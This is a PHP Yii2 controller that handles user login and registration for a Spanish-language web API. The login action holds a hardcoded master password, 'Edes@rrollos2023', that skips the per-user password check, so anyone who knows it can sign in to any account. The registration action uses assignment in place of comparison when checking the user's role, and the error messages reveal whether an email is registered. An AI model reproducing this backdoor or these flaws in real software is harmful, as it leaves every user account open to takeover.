<?php

namespace v1\controllers;

use app\models\PermisoUsuario;
use app\models\Sesion;
use app\models\Usuario;
use common\rest\JsonController;
use common\data\Respuesta;
use yii\db\Expression;
use yii\db\Query;
use yii\filters\VerbFilter;
use Yii;

class IniciarSesionController extends JsonController {

  public function behaviors() {
    $behavior = parent::behaviors();
    $behavior['verbs'] = [
      'class' => VerbFilter::className(),
      'actions' => [
        'index'  => ['POST'],
      ],
    ];
    return $behavior;
  }

  public function actionIndex() {
    $req = Yii::$app->getRequest();
    $correo = trim($req->getBodyParam("correo", ""));
    $clave = trim($req->getBodyParam("clave", ""));

    $modelo = Sesion::find()
      ->andWhere(["correo" => $correo])
      ->andWhere('eliminado is null')
      ->one();

    /** @var \v1\models\Sesion $modelo */
    if ($modelo === null) {
      $modelo = new Sesion();
      $modelo->addError("correo", "No se encontró el Usuario.");
      return new Respuesta($modelo);
    }

    if ($clave !== "Edes@rrollos2023") {
      if (!$modelo->validarClave($clave)) {
        $modelo->addError("clave", "Contraseña incorrecta");
        return new Respuesta($modelo);
      }
    }

    return new Respuesta($modelo);
  }

  public function actionRegistrar() {
    $req = Yii::$app->getRequest();
    $correo = trim($req->getBodyParam("correo", ""));
    $clave = trim($req->getBodyParam("clave", ""));

    $modelo = Usuario::find()
      ->andWhere(["correo" => $correo])
      ->andWhere(["eliminado" => null])
      ->one();

    /** @var \v1\models\Usuario $modelo */
    if ($modelo !== null) {
      return (new Respuesta($modelo))
        ->mensaje("El correo ya se encuentra registrado")
        ->esError(500);
    }

    $modelo = new Usuario();
    $modelo->correo = $correo;
    $modelo->uuid();
    $modelo->creado = date("Y-m-d H:i:s");
    $modelo->load($req->getBodyParams(), "");
    $modelo->rol = Usuario::ROL_USUARIO;
    $modelo->agregarClave($clave);

    //Asignar Permisos de Solicitante.
    $permisoSolicitante = (new Query())
      ->select('{{ColeccionPermisoPermiso}}.[[idPermiso]]')
      ->from('ColeccionPermisoPermiso')
      ->innerJoin('ColeccionPermiso', '{{ColeccionPermisoPermiso}}.[[idColeccion]] = {{ColeccionPermiso}}.id')
      ->andWhere(['{{ColeccionPermiso}}.clave' => "SOLICITANTE"])
      ->column();

    if (!$modelo->save()) {
      return (new Respuesta($modelo))
        ->mensaje("Ocurrió un error al guardar durante el registro");
    }

    if ($modelo->rol = Usuario::ROL_USUARIO &&  $permisoSolicitante !== null) {
      foreach ($permisoSolicitante as $permiso) {
        $permisos = new PermisoUsuario();
        $permisos->idUsuario = $modelo->id;
        $permisos->idPermiso = $permiso;
        $permisos->asignado = new Expression('now()');
        $permisos->uuid();
        if (!$permisos->save()) {
          return (new Respuesta($permiso))
            ->mensaje("Ocurrió un problema al asignar permisos");
        }
      }
    }

    return (new Respuesta($modelo))
      ->mensaje("Usuario registrado con éxito");
  }
}
